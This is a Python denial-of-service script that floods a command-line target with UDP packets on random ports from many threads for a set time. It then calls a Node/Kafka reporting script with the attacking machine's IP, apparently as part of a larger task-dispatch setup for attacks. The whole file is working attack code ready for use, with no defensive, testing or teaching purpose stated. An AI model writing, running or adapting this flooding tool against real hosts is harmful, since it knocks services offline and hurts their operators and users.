import os, socket, random, sys, time
from threading import Thread

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

try:
	target = str(sys.argv[1])
	threads = int(sys.argv[2])
	timer = float(sys.argv[3])
except:
	print('\n[+] Command usage: python ' + sys.argv[0] + ' <target> <threads> <time> !')
	sys.exit()

timeout = time.time() + 1 * timer

def attack():
	try:
		bytes = random._urandom(1024)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while time.time() < timeout:
			dport = random.randint(20, 55500)
			sock.sendto(bytes*random.randint(5,15), (target, dport))
		return
		sys.exit()
	except:
		pass

print('\n[+] Starting Attack..')
thread_list = []
for x in range(0, threads):
	thread_list.append(Thread(target=attack))

# Start all threads
for x in thread_list:
	x.start()

# Wait for all of them to finish
for x in thread_list:
	x.join()

print('\n[+] Attack Done..')
os.system(f"node ./kafka/producer/sendCompletedTask.js --task dos_attack --client_ip={local_ip} --msg='successfully perform dos attack' {target}")